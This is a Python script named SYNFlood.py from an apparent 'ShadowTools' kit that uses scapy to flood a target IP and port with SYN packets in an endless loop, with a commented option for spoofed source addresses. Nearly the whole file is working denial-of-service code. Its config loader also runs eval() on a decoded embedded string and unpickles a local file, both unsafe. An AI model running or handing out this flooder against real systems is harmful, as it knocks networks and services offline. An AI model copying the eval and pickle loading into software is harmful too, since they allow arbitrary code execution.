#!python3
# -*- coding: utf-8 -*-
########################################
# SYNFlood.py
#	floods a target with SYN packets
#
########################################
#
SoftName="ShadowTools-SYNflood"
ENCODED_CONFIG='null=='#/ENCODEDCONF
#
########################################
#		TO DO / IDEAS: 
# 
# 
########################################
# IMPORTS
########################################
#
# scapy for packet construction
from scapy.all import *
# pickle  for save/load of config files
import pickle
# socket for connecting to the server
import socket
# base64 for encoding/decoding of the config
from base64 import b64decode
# /imports


# LOAD CONFIG
def LoadConfig():
	#
	# PARSE CONFIG
	def ParseConfig(ENCODED_CONFIG):
		# this takes in the base64 string and first base64 decodes it into a bytes object?
		CONFIG=b64decode(ENCODED_CONFIG)
		# that object is further decode()'d into a string, then eval()'d into a dict
		try:
			CONFIG=eval(CONFIG.decode())
		except:
			return "broken"
		# this print line could be commented out, or put behind a DEBUG if()
		print(CONFIG)
		# lastly we yield the CONFIG dict that was decoded from the embedded config
		return CONFIG
	# /ParseConfig
	#
	# LoadConfig will first try to load the ENCODED_CONFIG if there is one present
	# if the encoded config is not the default/empty "null" then try to parse it
	# using the above defined function. this could be behind a try:/except: for error handling
	# in case the config is corrupt and unloadable as a dict
	#	as long as the CONFIG embed *starts* with 'null' it will appear empty.
	#	so you could have one line a='null >>realbase64stringhere' and it would be inert
	CONFIG='null'
	if(ENCODED_CONFIG[0:4]!="null"):
		try:
			CONFIG=ParseConfig(ENCODED_CONFIG)
			if(CONFIG=="broken"):
				raise
		except:
			CONFIG="null"
	if(CONFIG=="null"):
		# if that did not work, then we try to open a .shadow config file (pickle)
		shadowpath='./SYNflood.shadow'
		try:
			# Load config file, if there is one
			with open(shadowpath, 'rb') as file:
				CONFIG = pickle.load(file)
				print("Configuration loaded!")
		except:
			# finally we Load defaults, if no config file exists
			CONFIG	=	{
			# target IP address (should be a testing router/firewall)
			"TARGET_IP"		:	"FF.FF.FF.FF",
			# the target port u want to flood
			"TARGET_PORT"	:	80,
					}
		# yeild the configuration as the product of this function
	return CONFIG
# /LoadConfig


# SYN PACKET FLOOD
def SYN_flood(CONFIG):
	# forge IP packet with target ip as the destination IP address
	ip = IP(dst=CONFIG["TARGET_IP"])
	# or if you want to perform IP Spoofing (will work as well)
	# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
	
	# forge a TCP SYN packet with a random source port
	# and the target port as the destination port
	tcp = TCP(sport=RandShort(), dport=CONFIG["TARGET_PORT"], flags="S")
	
	# add some flooding data (1KB in this case)
	raw = Raw(b"X"*1024)
	
	# stack up the layers
	p = ip / tcp / raw
	# send the constructed packet in a loop until CTRL+C is detected 
	send(p, loop=1, verbose=0)
# /SYN_flood


# IF this script is launched as primary, then code executes,
#	keeping any execution of code in a block like this,
#	makes the script able to be read by another script as an import,
# 	so we can combine assets from multiple scripts
if __name__ == '__main__':
	# LoadConfig renders the CONFIG for us to use
	CONFIG=LoadConfig()
	# Launch this script with our CONFIG
	SYN_flood(CONFIG)
#
# 
##################################################
#             S H A D O W    T O O L             #
##################################################
# End Of File: SYNFlood.py
